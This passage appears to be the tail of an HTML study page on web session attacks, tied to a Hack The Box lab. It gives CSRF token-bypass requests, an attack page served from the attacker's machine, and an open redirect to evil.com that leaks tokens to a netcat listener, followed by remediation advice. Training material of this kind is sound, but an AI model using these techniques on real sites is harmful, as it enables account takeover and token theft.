2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e&lt;r;e+=8)t+=String.fromCharCode(n[e&gt;&gt;5]&gt;&gt;&gt;e%32&amp;255);return t}function a(n){var t=[];for(t[(n.length&gt;&gt;2)-1]=void 0,e=0;e&lt;t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e&lt;r;e+=8)t[e&gt;&gt;5]|=(255&amp;n.charCodeAt(e/8))&lt;&lt;e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o&lt;n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t&gt;&gt;&gt;4&amp;15)+r.charAt(15&amp;t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16&lt;e.length&amp;&amp;(e=c(e,8*n.length)),r=0;r&lt;16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&amp;&amp;define.amd?define(function(){return t}):"object"==typeof module&amp;&amp;module.exports?module.exports=t:n.md5=t}(this);
+//# sourceMappingURL=md5.min.js.map
+</code></pre>
+<p>Now serve the page and the JS code from above from your attacking machine:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+</code></pre>
+<p>Open a new private tab, and log in as a different user (<em>the victim</em>).</p>
+<p>While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine:</p>
+<p><img src="../../../images/session_security_csrf16.png" alt="csrf 16" /></p>
+<p>Now press "Start!". You notice that when Ela Stienen presses "Start!", her profile will become public.</p>
+<p><img src="../../../images/session_security_csrf17.png" alt="csrf 17" /></p>
+<h3 id="additional-csrf-protection-bypasses"><a class="header" href="#additional-csrf-protection-bypasses">Additional CSRF Protection Bypasses</a></h3>
+<h4 id="null-value"><a class="header" href="#null-value">Null Value</a></h4>
+<p>You can try making the CSRF token a null value:</p>
+<pre><code>CSRF-Token:
+</code></pre>
+<p>This may work because sometimes, the check is only looking for the header, and it does not validate the token value. In such cases, you can craft you cross-site requests using a null CSRF token, as long as the header is provided in the request.</p>
+<h4 id="random-csrf-token"><a class="header" href="#random-csrf-token">Random CSRF Token</a></h4>
+<p>Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value. For example, if the CSRF token were 32-bytes long, you would recreate a 32-byte token:</p>
+<p>Real:</p>
+<pre><code>CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331
+</code></pre>
+<p>Fake:</p>
+<pre><code>CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3
+</code></pre>
+<h4 id="use-another-sessions-csrf-token"><a class="header" href="#use-another-sessions-csrf-token">Use Another Session's CSRF Token</a></h4>
+<p>Using the same CSRF token across accounts. This may work in apps that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.</p>
+<p>Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, <code>CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331</code>.</p>
+<p>Log into the second account and change the value of CSRF token to <code>9cfffd9e8e78bd68975e295d1b3d3331</code> while issuing the same request. If the request is issued successfully, you can successfully execute CSRF attacks using a token generated through your account that is considered valid across multiple accounts.</p>
+<h4 id="request-method-tampering"><a class="header" href="#request-method-tampering">Request Method Tampering</a></h4>
+<p>Ty bypass anti-CSRF protections, you can try changing the request method from POST to GET and vice versa.</p>
+<p>For example, if the application is using POST, try changing it to GET:</p>
+<pre><code>POST /change_password
+POST body:
+new_password=pwned&amp;confirm_new=pwned
+</code></pre>
+<p>... to:</p>
+<pre><code>GET /change_password?new_password=pwned&amp;confirm_new=pwned
+</code></pre>
+<p>Unexpected requests may be served without the need for a CSRF token.</p>
+<h4 id="delete-the-csrf-token-parameter-or-send-a-blank-token"><a class="header" href="#delete-the-csrf-token-parameter-or-send-a-blank-token">Delete the CSRF Token Parameter or send a blank Token</a></h4>
+<p>Not sending a token works fairly often because of the following common application logic mistake. Apps sometimes only check the token's validity if the token exists or if the token is not blank.</p>
+<p>Real Request:</p>
+<pre><code>POST /change_password
+POST body:
+new_password=qwerty&amp;csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
+</code></pre>
+<p>... try:</p>
+<pre><code>POST /change_password
+POST body:
+new_password=qwerty
+</code></pre>
+<p>... or:</p>
+<pre><code>POST /change_password
+POST body:
+new_password=qwerty&amp;csrf_token=
+</code></pre>
+<h4 id="session-fixation--csrf"><a class="header" href="#session-fixation--csrf">Session Fixation &gt; CSRF</a></h4>
+<p>Sometimes, sites use something called a double-submit cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.</p>
+<p>If the double-submit cookie is used as the defense mechanism, the app is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.</p>
+<p>If this is the case and a session fixation vulnerability exists, an attacker could perform a successful CSRF attack as follows:</p>
+<ol>
+<li>Session fixation</li>
+<li>Execute CRSF with the following request:</li>
+</ol>
+<pre><code class="language-http">POST /change_password
+Cookie: CSRF-Token=fixed_token;
+POST body:
+new_password=pwned&amp;CSRF-Token=fixed_token
+</code></pre>
+<h4 id="anti-csrf-protection-via-the-referrer-header"><a class="header" href="#anti-csrf-protection-via-the-referrer-header">Anti-CSRF Protection via the Referrer Header</a></h4>
+<p>If an app is using the referrer header as an anti-CRSF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script:</p>
+<pre><code>&lt;meta name="referrer" content="no-referrer"
+</code></pre>
+<h4 id="bypass-the-regex"><a class="header" href="#bypass-the-regex">Bypass the RegEx</a></h4>
+<p>Sometimes the referrer has a whitelist regex or a regex that allows one specific domain.</p>
+<p>Suppose that the referrer header is checking for <em>google.com</em>. You could try something like <code>www.google.com.pwned.m3</code>, which may bypass the regex! If it uses its own domain (<em>target.com</em>) as a whitelist, try using the target domain as follows <code>www.target.com.pwned.m3</code>.</p>
+<p>You can try some of the following as well:</p>
+<p><code>www.pwned.m3?www.target.com</code> or <code>www.pwned.m3/www.target.com</code>.</p>
+<h3 id="open-redirect"><a class="header" href="#open-redirect">Open Redirect</a></h3>
+<p>... vuln occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate app's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim.</p>
+<p>Take a look:</p>
+<pre><code class="language-php">$red = $_GET['url'];
+header("Location: " . $red);
+</code></pre>
+<p>In the line of code above, a variable called <code>red</code> is defined that gets its value from a parameter called <code>url</code>. <code>$_GET</code> is a PHP superglobal variable that enables you to access the <code>url</code> parameter value.</p>
+<p>The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of <code>red</code>, without any validation. You are facing an Open Redirect vuln here.</p>
+<p>The malicious URL an attacker would send leveraging the Open Redirect vuln would look as follows:</p>
+<pre><code>trusted.site/index.php?url=https://evil.com
+</code></pre>
+<h4 id="example-8"><a class="header" href="#example-8">Example</a></h4>
+<p>If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the <code>redirect_uri</code> parameter. A <code>token</code> is also included in the POST request. This token could be a session or anti-CSRF token, and therefore, useful to an attacker.</p>
+<p><img src="../../../images/session_security_redirect1.png" alt="session security redirect 1" /></p>
+<p>Now, test if you can control the site where the <code>redirect_uri</code> parameter points to. In other words, check if the app performs the redirection without any kind of validation.</p>
+<p>Set up a Netcat listener.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nc -lvnp 1337
+</code></pre>
+<p>Change the url from:</p>
+<pre><code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;
+</code></pre>
+<p>... to:</p>
+<pre><code>http://oredirect.htb.net/?redirect_uri=http://&lt;VPN/TUN Adapter IP&gt;:PORT&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;
+</code></pre>
+<p>Open a new private window and navigate to the link.</p>
+<p>When the victim enters their email, you will notice a connection being made to your listener.</p>
+<p><img src="../../../images/session_security_redirect2.png" alt="session security redirect 2" /></p>
+<p>Open redirect vulns are usually exploited by attacker to create legitimate-looking phishing URLs. When a redirection functionality involves user tokens, attackers can also exploit open redirect vulns to obtain user tokens.</p>
+<h2 id="remediation-advice"><a class="header" href="#remediation-advice">Remediation Advice</a></h2>
+<h3 id="session-hijacking-1"><a class="header" href="#session-hijacking-1">Session Hijacking</a></h3>
+<p>User session monitoring/anomaly detection solutions can detect session hijacking. It is a safer bet to counter session hijacking by trying to eliminate all vulns mentioned above.</p>
+<h3 id="session-fixation-1"><a class="header" href="#session-fixation-1">Session Fixation</a></h3>
+<p>... can be remediated by generating a new session identifier upon an authenticated operation. Simply invalidating any pre-login session identifier and generating a new one post-login should be enough.</p>
+<h4 id="examples"><a class="header" href="#examples">Examples</a></h4>
+<h5 id="php-1"><a class="header" href="#php-1">PHP</a></h5>
+<pre><code class="language-php">session_regenerate_id(bool $delete_old_session = false): bool
+</code></pre>
+<p>The above updates the current session identifier with a newly generated one. The current session information is kept.</p>
+<h5 id="java-1"><a class="header" href="#java-1">Java</a></h5>
+<pre><code class="language-java">...
+session.invalidate();
+session = request.getSession(true);
+...
+</code></pre>
+<p>The above invalidates the current session and gets a new session from the request object.</p>
+<h5 id="net-1"><a class="header" href="#net-1">.NET</a></h5>
+<pre><code class="language-c#">...
+Session.Abandon();
+...
+</code></pre>
+<p>For session invalidation purposes, the .NET framework utilizes <code>Session.Abandon();</code>, but there is a caveat. <code>Session.Abandon();</code> is not sufficient for this task. Microsoft: "When you abandon a session, the session ID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same session ID but will have a new session state instance." So, to address session fixation holistically, one needs to utilize <code>Session.Abandon();</code> and overwrite the cookie header or implement more complex cookie-based session management by enriching the information held within and cookie and performing server-side checks.</p>
+<h3 id="xss-1"><a class="header" href="#xss-1">XSS</a></h3>
+<h4 id="validation-of-user-input"><a class="header" href="#validation-of-user-input">Validation of User Input</a></h4>
+<p>The app should validate every input received immediately upon receiving it. Input validation should be performed on the server-side, using a positive approach (<em>limit the permitted input chars to chars that appear in a whitelist</em>), instead of a negative approach (<em>preventing the usage of chars that appear in a blacklist</em>), since the positive approach helps the programmer avoid potential flaws that result from mishandling potentially malicious chars. Input validation implementation must include the following validation principles in the following order:</p>
+<ul>
+<li>verify the existence of actual input, do not accept null or empty values when the input is not optional</li>
+<li>enforce input size restriction; make sure the input's length is within the expected range</li>
+<li>validate the input type, make sure the data received is, in fact, the type expected</li>
+<li>restrict the input range of values; the input's value should be within the acceptable range of values for the input's role in the application</li>
+<li>sanitize special chars, unless there is a unique functional needed, the input char set should be limited to azAZ09</li>
+<li>ensure logical input compliance</li>
+</ul>
+<h4 id="html-encoding-to-user-controlled-output"><a class="header" href="#html-encoding-to-user-controlled-output">HTML Encoding to User-Controlled Output</a></h4>
+<p>The app should encode user-controlled input in the following cases:</p>
+<ul>
+<li>prior to embedding user-controlled input within browser targeted output</li>
+<li>prior to documenting user-controlled input into log files</li>
+</ul>
+<p>The following inputs match the user-controlled criteria:</p>
+<ul>
+<li>dynamic values that originate directly from user input</li>
+<li>user-controlled data repository values</li>
+<li>session values originated directly from user input or user-controlled data repository values</li>
+<li>values received from external entities</li>
+<li>any other value which could have been affected by the user</li>
+<li>the encoding process should verify that input matching the given criteria will be processed through a data sanitization component, which will replace non-alphanumerical chars in their HTML representation before including these values in the output sent to the user or the log file; this operation ensures that every script will be presented to the user rather than executed in the user's browser</li>
+</ul>
+<h4 id="additional-instructions"><a class="header" href="#additional-instructions">Additional Instructions</a></h4>
+<ul>
+<li>do not embed user input into client-side scripts; values deriving from user input should not be directly embedded as part of an HTML tag, script tag, HTML event, or HTML property</li>
+<li>complimentary instructions for protecting the application against cross-site scripting can be found <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">here</a></li>
+<li>a list of HTML encoded chars representations can be found <a href="https://www.degraeve.com/reference/specialcharacters.php">here</a></li>
+</ul>
+<blockquote>
+<p>[!TIP]
+Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture them.</p>
+</blockquote>
+<h3 id="csrf-1"><a class="header" href="#csrf-1">CSRF</a></h3>
+<p>It is recommended that whenever a request is made to access each function, a check should be done to ensure the user is authenticated to perform that action.</p>
+<p>The preferred way to reduce the risk of a CSRF vuln is to modify session management mechanisms and implement additional, randomly generated, and non-predictable security tokens or responses to each HTTP request related to sensitive operations.</p>
+<p>Other mechanisms that can impede the ease of exploitation include:</p>
+<ul>
+<li>Referrer header checking</li>
+<li>Performing verification on the order in which pages are called</li>
+<li>Forcing sensitive functions to confirm information received</li>
+</ul>
+<p>In addition to the above, explicitly stating cookie usage with the <a href="https://web.dev/articles/samesite-cookies-explained">SameSite</a> attribute can also prove an effective anti-CSRF-mechanism.</p>
+<h3 id="open-redirect-1"><a class="header" href="#open-redirect-1">Open Redirect</a></h3>
+<p>The safe use of redirects and forwards can be done in several ways:</p>
+<ul>
+<li>do not use user-supplied URLs and have methods to strictly validate the URL</li>
+<li>if user input cannot be avoided, ensure that the supplied value is valid, appropriate for the app, and is authorized for the user</li>
+<li>it is recommended that any destination input be mapped to a value rather than the actual URL or portion of the URL and that server-side code translates this value to the target URL</li>
+<li>sanitize input by creating a list of trusted URLs</li>
+<li>force all redirects to first go through a page notifying users that they are being redirected from your site and require them to click a link to confirm<!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --></li>
+</ul>
+<div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
+<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2025 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../attack/web/web_security_techniques/javascript_deobfuscation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../attack/windows/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../attack/web/web_security_techniques/javascript_deobfuscation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../attack/windows/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
